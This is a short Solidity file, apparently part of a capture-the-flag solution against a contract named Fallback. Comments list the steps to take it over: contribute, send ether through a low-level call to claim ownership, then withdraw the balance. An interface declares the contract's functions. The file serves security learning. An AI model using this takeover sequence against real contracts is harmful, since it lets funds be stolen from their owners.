pragma solidity ^0.8;

// Ownership must be asserted from the player's wallet address:
// 1. Execute fallback's contribute function with a value of 1 ether.
// 2. Invoke the fallback contract using address(fallback).call{value: 1}("") for ownership claim.
// 3. Trigger the withdrawal in the fallback contract.

interface IFallback {
    function owner() external view returns (address);
    function contributions(address) external view returns (uint256);
    function contribute() external payable;
    function withdraw() external;
}